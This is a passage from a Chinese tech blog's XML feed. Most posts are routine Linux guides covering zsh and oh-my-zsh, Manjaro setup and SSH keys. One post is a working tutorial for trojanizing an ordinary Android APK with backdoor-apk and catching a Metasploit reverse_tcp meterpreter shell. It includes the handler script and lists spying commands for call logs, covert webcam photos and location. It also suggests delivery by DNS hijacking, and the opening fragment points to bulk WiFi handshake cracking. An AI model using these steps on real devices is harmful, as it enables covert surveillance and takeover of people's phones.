handshake</code>数据包，第二步暴力破解数据文件。因此<br>可以使用更强大的工具<code>wlandump-ng</code>：一次性从附近的网络上抓取所有的 handshake 信息，而实现快速破解WiFi,详情见<a href="https://github.com/brannondorsey/wifi-cracking/blob/master/appendix.zh.md" target="_blank" rel="noopener">wifi-cracking</a>和<a href="https://github.com/ZerBea/hcxtools" target="_blank" rel="noopener">hcxtools</a></p><p><strong>最大的安全隐患永远是人</strong>，优先使用WiFi万能钥匙也许会有意外惊喜(配合手机自带的WiFi分享功能，可以直接得到密码)。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.bennythink.com/wifi-cracking.html" target="_blank" rel="noopener">https://www.bennythink.com/wifi-cracking.html</a></li><li><a href="https://klionsec.github.io/2015/04/14/aircrack-hascat/" target="_blank" rel="noopener">https://klionsec.github.io/2015/04/14/aircrack-hascat/</a></li><li><a href="http://byd.dropsec.xyz/2016/08/10/HashCat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/" target="_blank" rel="noopener">http://byd.dropsec.xyz/2016/08/10/HashCat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/</a></li><li><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=21342&amp;highlight=wifi" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=21342&amp;highlight=wifi</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;====================&lt;/p&gt;
&lt;h2 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h2&gt;&lt;p&gt;这里假定你用的是Manjaro Linux 系统，&lt;a href=&quot;/2018/03/19/Bumblebee/&quot;&gt;配置好独立显卡&lt;/a&gt;，本文提到的软件可以直接用&lt;code&gt;sudo pacman -S aircrack-ng hashcat hashcat-utils&lt;/code&gt;安装,Kali Linux默认集成，其他环境请自行安装。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;aircrack-ng:&lt;br&gt;&lt;a href=&quot;https://www.aircrack-ng.org/doku.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;aircrack-ng&lt;/a&gt;是目前最热门的WiFi破解领域的软件。Aircrack-ng 套件包含的工具能够捕捉数据包和握手包，生成通信数据，或进行暴力破解攻击以及字典攻击。&lt;/li&gt;
&lt;li&gt;hashcat:&lt;br&gt;&lt;a href=&quot;https://hashcat.net/wiki/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;hashcat&lt;/a&gt;支持N多种算法，充分利用GPU性能，是目前最快的利用GPU破解Hash的软件。&lt;/li&gt;
&lt;li&gt;USB无线网卡:&lt;br&gt;推荐3070，8187，便宜好用（某宝十几块钱就能买到）,当然笔记本自带的无线网卡也可以。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;由于hashcat使用GPU破解，因此需要安装依赖，&lt;code&gt;sudo pacman -S ocl-icd opencl-nvidia&lt;/code&gt;,执行&lt;br&gt;&lt;code&gt;sudo tee /proc/acpi/bbswitch &amp;lt;&amp;lt;&amp;lt; ON&lt;/code&gt;以让CUDA程序使用英伟达独立显卡。&lt;/p&gt;
    
    </summary>
    
    
      <category term="WiFi" scheme="https://xiaotaoist.github.io/tags/WiFi/"/>
    
  </entry>
  
  <entry>
    <title>终端环境之Zsh＆oh-my-zsh</title>
    <link href="https://xiaotaoist.github.io/2018/03/14/oh-my-zsh/"/>
    <id>https://xiaotaoist.github.io/2018/03/14/oh-my-zsh/</id>
    <published>2018-03-14T01:41:21.000Z</published>
    <updated>2018-03-17T12:56:49.017Z</updated>
    
    <content type="html"><![CDATA[<p>==============</p><h2 id="终极-Shell-zsh"><a href="#终极-Shell-zsh" class="headerlink" title="终极 Shell(zsh)"></a>终极 Shell(zsh)</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><ul><li>Z Shell(Zsh) 是一种Unix shell，它可以用作为交互式的登录shell，也是一种强大的shell脚本命令解释器。它在兼容 Bash 的同时 (默认不兼容，除非设置成 emulate sh) 还提供了很多改进。</li><li>改进特性:<ul><li>色彩高亮</li><li>更强大的自动补全</li><li>支持通配符搜索</li><li>兼容Bash</li><li>完全可定制化</li></ul></li></ul><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><blockquote><p>sudo pacman -S zsh zsh-completions</p></blockquote><p>此处为Arch Linux，其他平台请使用自带的包管理器，为了使用更强大的补全功能建议同时安装 zsh-completions包</p><a id="more"></a><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ul><li>将zsh设为默认shell<blockquote><p>chsh -s /bin/zsh</p></blockquote></li><li>其他发行版可先用chsh -l 查看zsh安装位置</li></ul><h2 id="Oh-my-zsh"><a href="#Oh-my-zsh" class="headerlink" title="Oh-my-zsh"></a>Oh-my-zsh</h2><ul><li>curl 和 git 应该已被安装(若没有Arch 用sudo pacman -S curl git 安装，其他发行版类似。)</li><li><a href="http://ohmyz.sh" target="_blank" rel="noopener">Oh-my-zsh</a>是一个傻瓜化的zsh配置管理框架，提供了大量实用的功能，主题等。做到开箱即用，现在基本成为了Zsh的标配。</li><li><p>安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span></span><br></pre></td></tr></table></figure></li><li><p>配置文件位置： ~/.zshrc</p></li><li><p>主题<br>oh-my-zsh自带大量<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Themes" target="_blank" rel="noopener">Themes</a>，默认为robbyrussell。你也可以选择random，即每次打开终端随机选一个主题。</p><blockquote><p>ZSH_THEME=”你喜欢的主题名”<br><img src="/img/zsh_theme.png" alt="themes"></p></blockquote></li><li><p>常用插件</p><ul><li>git: 提供大量git的Aliases，<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Plugin:git" target="_blank" rel="noopener">详情</a></li><li>archlinux： 提供一些pacman包管理器的Aliases，<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Plugins#archlinux" target="_blank" rel="noopener">详情</a></li><li>z：经常使用cd 切换路径，积累一定数据后可用z快速跳转到指定位置</li><li>sudo：按两次[Esc]自动在前面加sudo</li><li>pip： 补全pip 命令</li><li><p>zsh-autosuggestions: 根据历史记录进行智能提示(按 ctrl+E 是正确姿势)。非oh-my-zsh自带，用git下载安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$ZSH_CUSTOM</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure></li><li><p>zsh-syntax-highlighting：命令高亮，正确显示绿色，错误为红色。非oh-my-zsh自带，用git下载安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure><blockquote><p>plugins=( 你想启用的插件，空格分隔 )<br><img src="/img/zsh_plugins.png" alt="plugins"></p></blockquote></li><li>重新加载配置文件，立刻生效。<blockquote><p>source ~/.zshrc</p></blockquote></li></ul></li><li>其他插件请参见官方<a href="https://github.com/robbyrussell/oh-my-zsh/wiki/Plugins-Overview" target="_blank" rel="noopener">wiki</a></li><li>少即是多，启用大量插件会严重拖慢zsh启动速度</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://wiki.archlinux.org/index.php/Zsh_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/Zsh_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)</a></li><li><a href="http://zsh.sourceforge.net/FAQ/zshfaq01.html#l4" target="_blank" rel="noopener">http://zsh.sourceforge.net/FAQ/zshfaq01.html#l4</a></li><li><a href="https://en.wikipedia.org/wiki/Z_shell" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Z_shell</a></li><li><a href="http://macshuo.com/?p=676" target="_blank" rel="noopener">http://macshuo.com/?p=676</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;==============&lt;/p&gt;
&lt;h2 id=&quot;终极-Shell-zsh&quot;&gt;&lt;a href=&quot;#终极-Shell-zsh&quot; class=&quot;headerlink&quot; title=&quot;终极 Shell(zsh)&quot;&gt;&lt;/a&gt;终极 Shell(zsh)&lt;/h2&gt;&lt;h3 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Z Shell(Zsh) 是一种Unix shell，它可以用作为交互式的登录shell，也是一种强大的shell脚本命令解释器。它在兼容 Bash 的同时 (默认不兼容，除非设置成 emulate sh) 还提供了很多改进。&lt;/li&gt;
&lt;li&gt;改进特性:&lt;ul&gt;
&lt;li&gt;色彩高亮&lt;/li&gt;
&lt;li&gt;更强大的自动补全&lt;/li&gt;
&lt;li&gt;支持通配符搜索&lt;/li&gt;
&lt;li&gt;兼容Bash&lt;/li&gt;
&lt;li&gt;完全可定制化&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;sudo pacman -S zsh zsh-completions&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;此处为Arch Linux，其他平台请使用自带的包管理器，为了使用更强大的补全功能建议同时安装 zsh-completions包&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://xiaotaoist.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>笔记本安装 Manjaro Linux</title>
    <link href="https://xiaotaoist.github.io/2018/03/09/archlinuxcn/"/>
    <id>https://xiaotaoist.github.io/2018/03/09/archlinuxcn/</id>
    <published>2018-03-09T08:07:36.000Z</published>
    <updated>2019-05-19T09:30:58.457Z</updated>
    
    <content type="html"><![CDATA[<p>====================</p><h2 id="Manjaro简介"><a href="#Manjaro简介" class="headerlink" title="Manjaro简介"></a>Manjaro简介</h2><p><a href="https://manjaro.org/" target="_blank" rel="noopener">Manjaro Linux</a>是一款基于Arch Linux、对用户友好、全球排名第2的Linux发行版。（数据来自<a href="https://distrowatch.com/" target="_blank" rel="noopener">DistroWatch</a>），它的一些显著特性包括：简化、用户友好的安装过程，自动检测计算机的硬件（例如显卡），为系统自动安装必要的软件（例如显卡驱动程序），它有自己的专用软件仓库和更稳定的软件包、可以轻松安装和使用多个内核。</p><h2 id="无法进入安装程序"><a href="#无法进入安装程序" class="headerlink" title="无法进入安装程序"></a>无法进入安装程序</h2><ul><li>如果自动图形界面启动不了，卡在以下位置：<ol><li>Started TLP system startup/shutdown</li><li>A start job is running for livemedia mhwd scripe(xx s/no limit)</li></ol></li><li>可尝试添加内核参数<br>  看到启动菜单,用方向键移动选中boot项，按[E]键编辑<br>  把driver=free改为driver=intel，并在后面添加acpi_osi参数，最后效果如下:<blockquote><p>driver=intel xdriver=mesa acpi_osi=! acpi_osi=’Windows 2009’  </p></blockquote></li><li>修改完成后按[F10]启动，并完成安装。</li></ul><a id="more"></a><h2 id="配置-archlinuxcn-源"><a href="#配置-archlinuxcn-源" class="headerlink" title="配置 archlinuxcn 源"></a>配置 archlinuxcn 源</h2><h3 id="archlinuxcn-简介"><a href="#archlinuxcn-简介" class="headerlink" title="archlinuxcn 简介"></a>archlinuxcn 简介</h3><p>Arch Linux <a href="https://www.archlinuxcn.org/archlinux-cn-repo-and-mirror/" target="_blank" rel="noopener">中文社区仓库</a> 是由 Arch Linux 中文社区驱动的非官方用户仓库。包含大量中文用户常用软件、工具、字体/美化包等。</p><h3 id="启用archlinuxcn库"><a href="#启用archlinuxcn库" class="headerlink" title="启用archlinuxcn库"></a>启用archlinuxcn库</h3><ul><li>先换一下国内源，加快下载速度<blockquote><p>sudo pacman-mirrors -lc</p></blockquote></li><li>修改配置文件<blockquote><p>sudo nano /etc/pacman.conf</p></blockquote></li><li>在文末添加<blockquote><p>[archlinuxcn]<br>Server = <a href="https://mirrors.zju.edu.cn/archlinuxcn/$arch" target="_blank" rel="noopener">https://mirrors.zju.edu.cn/archlinuxcn/$arch</a></p></blockquote></li><li>添加PGP密钥<blockquote><p>sudo pacman -Syy &amp;&amp; sudo pacman -S archlinuxcn-keyring</p></blockquote></li></ul><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><blockquote><p>sudo pacman -S yay</p></blockquote><ul><li>以后就可以直接使用 yay softname 搜索并安装AUR库中的软件。</li></ul><h2 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h2><ul><li>推荐Rime<blockquote><p>sudo pacman -S fcitx-im fcitx-configtool fcitx-rime</p></blockquote></li></ul><p><a href="https://github.com/xiaoTaoist/rime-dict" target="_blank" rel="noopener">Rime扩展增强词库</a></p><ul><li>创建配置文件<blockquote><p>vim ~/.xprofile </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export GTK_IM_MODULE=fcitx</span><br><span class="line">export QT_IM_MODULE=fcitx</span><br><span class="line">export XMODIFIERS=&quot;@im=fcitx&quot;</span><br></pre></td></tr></table></figure></blockquote></li></ul><p>注销生效</p><h2 id="其他常用软件"><a href="#其他常用软件" class="headerlink" title="其他常用软件"></a>其他常用软件</h2><p>一下软件均可通过　pacman / yay 进行安装使用</p><ul><li>albert: 谁用谁知道的效率增强神器</li><li>chromium: Chrome浏览器 开源版</li><li>deepin-wechat / electronic-wechat : Linux下微信解决方案</li><li>wps-office: WPS的Linux版比libreoffice更方便些</li><li>listen1:  Listen 1可以搜索和播放来自网易云音乐，虾米，QQ音乐，酷狗音乐，酷我音乐网站的歌曲</li><li>goldendict: 功能强大的词典软件</li><li>keepassxc: 跨平台的本地密码管理器</li><li>noto-fonts-cjk: 中文字体，当然还有文泉系列(wqy-microhei)</li><li>proxychains-ng: 你懂的</li><li>virtualbox: 开源、轻巧，快速的虚拟机软件</li><li>zsh /　fish : 人生苦短，我用zsh, zsh 建议搭配<a href="/2018/03/14/oh-my-zsh/">oh-my-zsh</a>使用, fish 可以开箱即用</li><li>vlc/smplayer： 功能强大本地媒体播放器</li><li>visual-studio-code-bin： 微软发布的开源代码编辑器，支持多种语言。</li><li>Dbeaver: 一个通用的数据库管理工具和SQL 客户端,提供dbeaver-ce 社区版</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;====================&lt;/p&gt;
&lt;h2 id=&quot;Manjaro简介&quot;&gt;&lt;a href=&quot;#Manjaro简介&quot; class=&quot;headerlink&quot; title=&quot;Manjaro简介&quot;&gt;&lt;/a&gt;Manjaro简介&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://manjaro.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Manjaro Linux&lt;/a&gt;是一款基于Arch Linux、对用户友好、全球排名第2的Linux发行版。（数据来自&lt;a href=&quot;https://distrowatch.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;DistroWatch&lt;/a&gt;），它的一些显著特性包括：简化、用户友好的安装过程，自动检测计算机的硬件（例如显卡），为系统自动安装必要的软件（例如显卡驱动程序），它有自己的专用软件仓库和更稳定的软件包、可以轻松安装和使用多个内核。&lt;/p&gt;
&lt;h2 id=&quot;无法进入安装程序&quot;&gt;&lt;a href=&quot;#无法进入安装程序&quot; class=&quot;headerlink&quot; title=&quot;无法进入安装程序&quot;&gt;&lt;/a&gt;无法进入安装程序&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;如果自动图形界面启动不了，卡在以下位置：&lt;ol&gt;
&lt;li&gt;Started TLP system startup/shutdown&lt;/li&gt;
&lt;li&gt;A start job is running for livemedia mhwd scripe(xx s/no limit)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;可尝试添加内核参数&lt;br&gt;  看到启动菜单,用方向键移动选中boot项，按[E]键编辑&lt;br&gt;  把driver=free改为driver=intel，并在后面添加acpi_osi参数，最后效果如下:&lt;blockquote&gt;
&lt;p&gt;driver=intel xdriver=mesa acpi_osi=! acpi_osi=’Windows 2009’  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;修改完成后按[F10]启动，并完成安装。&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://xiaotaoist.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>SSH免密登录</title>
    <link href="https://xiaotaoist.github.io/2018/03/07/ssh-keygen/"/>
    <id>https://xiaotaoist.github.io/2018/03/07/ssh-keygen/</id>
    <published>2018-03-07T01:37:50.000Z</published>
    <updated>2018-03-31T02:21:41.844Z</updated>
    
    <content type="html"><![CDATA[<p>========================</p><hr><h2 id="SSH单密钥配置"><a href="#SSH单密钥配置" class="headerlink" title="SSH单密钥配置"></a>SSH单密钥配置</h2><ul><li>生成ssh密钥文件<blockquote><p>ssh-keygen -t ecdsa -b 521</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-t 为指定加密算法类型，支持rsa，dsa，ecdsa</span><br><span class="line">-b 指定密钥大小，ecdsa算法默认大小为256位</span><br><span class="line"></span><br><span class="line">ECDSA (椭圆曲线数字签名算法) 生成的密钥更小，安全性更高</span><br></pre></td></tr></table></figure></blockquote></li></ul><p>如果不需要更改密钥存储位置并为私钥设置密码，可以一路回车<br>ssh-keygen默认会在 $HOME/.ssh/目录下生成2个文件：id_ecdsa.pub（公钥）和id_ecdsa（私钥）。</p><ul><li>将公钥上传到远程服务器<blockquote><p>ssh-copy-id  username@remote_ip</p></blockquote></li></ul><p>ssh-copy-id会将你刚刚生成的公钥(id_ecdsa.pub)自动写入到远程主机的$HOME/.ssh/authorized_keys文件中</p><a id="more"></a><ul><li>测试<blockquote><p>ssh username@remote_ip</p></blockquote></li></ul><h2 id="SSH多密钥配置"><a href="#SSH多密钥配置" class="headerlink" title="SSH多密钥配置"></a>SSH多密钥配置</h2><ul><li><p>生成密钥</p><blockquote><p>ssh-keygen -t ecdsa -b 521 -f  ~/.ssh/one   -C “remote_ip”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-f 指定生成密钥保存位置与名称 建议放到 $HOME/.ssh/目录下</span><br><span class="line">-C 添加注释，类如邮箱，远程主机IP，用户名之类，默认为本机主机名和用户</span><br></pre></td></tr></table></figure></blockquote></li><li><p>将公钥上传到远程服务器</p><blockquote><p>ssh-copy-id  -i ~/.ssh/one.pub username@remote_ip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-i 指定上传公钥名称</span><br></pre></td></tr></table></figure></blockquote></li><li><p>创建SSH配置文件来管理多组密钥</p><blockquote><p>vim ~/.ssh/config </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host remote_ip1</span><br><span class="line">  IdentitiesOnly yes</span><br><span class="line">  IdentityFile ~/.ssh/one</span><br><span class="line">Host remote_ip2</span><br><span class="line">  IdentitiesOnly yes</span><br><span class="line">  IdentityFile ~/.ssh/two</span><br></pre></td></tr></table></figure></blockquote></li></ul><blockquote><p>Host后面写: 远程主机ip地址<br>IdentityFile后面写 你创建的密钥位置与名称</p></blockquote><ul><li>测试<blockquote><p>ssh username@remote_ip</p></blockquote></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li><p>将本地文件上传到远程主机</p><blockquote><p>scp local_file remote_username@remote_ip:remote_folder  </p></blockquote></li><li><p>将远程主机中的文件下载到本地</p><blockquote><p>scp remote_username@remote_ip:remote_file   local_folder</p></blockquote></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://wiki.archlinux.org/index.php/SSH_keys" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/SSH_keys</a></li><li><a href="http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;========================&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;SSH单密钥配置&quot;&gt;&lt;a href=&quot;#SSH单密钥配置&quot; class=&quot;headerlink&quot; title=&quot;SSH单密钥配置&quot;&gt;&lt;/a&gt;SSH单密钥配置&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;生成ssh密钥文件&lt;blockquote&gt;
&lt;p&gt;ssh-keygen -t ecdsa -b 521&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-t 为指定加密算法类型，支持rsa，dsa，ecdsa&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-b 指定密钥大小，ecdsa算法默认大小为256位&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ECDSA (椭圆曲线数字签名算法) 生成的密钥更小，安全性更高&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果不需要更改密钥存储位置并为私钥设置密码，可以一路回车&lt;br&gt;ssh-keygen默认会在 $HOME/.ssh/目录下生成2个文件：id_ecdsa.pub（公钥）和id_ecdsa（私钥）。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将公钥上传到远程服务器&lt;blockquote&gt;
&lt;p&gt;ssh-copy-id  username@remote_ip&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ssh-copy-id会将你刚刚生成的公钥(id_ecdsa.pub)自动写入到远程主机的$HOME/.ssh/authorized_keys文件中&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://xiaotaoist.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>生成apk后门实现msf控制安卓手机</title>
    <link href="https://xiaotaoist.github.io/2018/03/02/backdoor-apk/"/>
    <id>https://xiaotaoist.github.io/2018/03/02/backdoor-apk/</id>
    <published>2018-03-02T10:00:03.000Z</published>
    <updated>2018-03-31T02:32:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>========================</p><hr><h2 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h2><ul><li>Kali Linux</li><li>android</li><li>同一局域网 </li></ul><h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><p>安装依赖环境</p><blockquote><p>apt-get install lib32z1 lib32ncurses5  lib32stdc++6</p></blockquote><p>下载 backdoor-apk</p><blockquote><p>git clone <a href="https://github.com/dana-at-cp/backdoor-apk.git" target="_blank" rel="noopener">https://github.com/dana-at-cp/backdoor-apk.git</a></p></blockquote><a id="more"></a><p>下载完成后进入文件目录</p><blockquote><p>cd backdoor-apk/backdoor-apk</p></blockquote><p>将test.apk 移动到当前工作目录(backdoor-apk/backdoor-apk)下并执行</p><blockquote><p>./backdoor-apk.sh test.apk<br>PS:test.apk 为事先准备好的正常apk应用名</p></blockquote><p>选择payload<br><img src="/img/apk_1.png" alt="apk">  </p><p>出现 [*] Aligning recompiled APK…done ,便会在backdoor-apk/backdoor-apkoriginal/dist/ 目录下生成带后门的apk文件</p><h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><p>执行</p><blockquote><p>msfconsole -r backdoor-apk.rc</p></blockquote><p>手机安装test.apk并打开 ,等一会就会发现已经获得了手机的meterpreter shell<br><img src="/img/apk_msf.png" alt="msf"><br>可以看到获得反弹shell 会话<br>用sessions -i number  切换到当前会话<br>此处执行check_root 测试<br>其他功能可输入help 查看帮助，比如dump_callog(获取通话记录) webcam_snap(偷拍) geolocate(获取地理位置)等</p><p>可以用vim 打开backdoor-apk.rc 看到内容 与手动执行(msfconsole)一样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line">set payload android/meterpreter/reverse_tcp  </span><br><span class="line">set lhost 192.168.0.105  </span><br><span class="line">set lport 8888  </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol><li>[!] Failed to recompile original project with backdoor <ul><li>现在很多应用都会做一些处理防止反编译，可以上 <a href="https://apkpure.com" target="_blank" rel="noopener">APKPure</a> 或<a href="https://www.coolapk.com" target="_blank" rel="noopener">酷安</a> 去找一些历史版本会增加成功概率</li><li>apktools 过旧，可以把Kail 更到最新</li><li>一定要把 apk 放到backdoor-apk.sh 所在目录下</li></ul></li></ol><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><ul><li>外网环境可使用vps转发 或 ngrok穿透 参考<ul><li>vps 转发 <a href="http://www.freebuf.com/sectool/136574.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/136574.html</a></li><li>ngrok穿透 <a href="http://www.freebuf.com/sectool/162046.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/162046.html</a></li></ul></li><li>植入木马方式<ul><li>内网dns劫持: <a href="http://www.freebuf.com/sectool/136574.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/136574.html</a></li><li>物理接触</li></ul></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="http://www.secist.com/archives/680.html" target="_blank" rel="noopener">http://www.secist.com/archives/680.html</a></li><li><a href="http://www.4hou.com/mobile/8290.html" target="_blank" rel="noopener">http://www.4hou.com/mobile/8290.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;========================&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;实验环境：&quot;&gt;&lt;a href=&quot;#实验环境：&quot; class=&quot;headerlink&quot; title=&quot;实验环境：&quot;&gt;&lt;/a&gt;实验环境：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Kali Linux&lt;/li&gt;
&lt;li&gt;android&lt;/li&gt;
&lt;li&gt;同一局域网 &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;生成后门&quot;&gt;&lt;a href=&quot;#生成后门&quot; class=&quot;headerlink&quot; title=&quot;生成后门&quot;&gt;&lt;/a&gt;生成后门&lt;/h2&gt;&lt;p&gt;安装依赖环境&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;apt-get install lib32z1 lib32ncurses5  lib32stdc++6&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;下载 backdoor-apk&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;git clone &lt;a href=&quot;https://github.com/dana-at-cp/backdoor-apk.git&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/dana-at-cp/backdoor-apk.git&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://xiaotaoist.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Vimium 入门</title>
    <link href="https://xiaotaoist.github.io/2018/02/28/vimium/"/>
    <id>https://xiaotaoist.github.io/2018/02/28/vimium/</id>
    <published>2018-02-28T09:09:00.000Z</published>
    <updated>2018-03-31T02:25:24.611Z</updated>
    
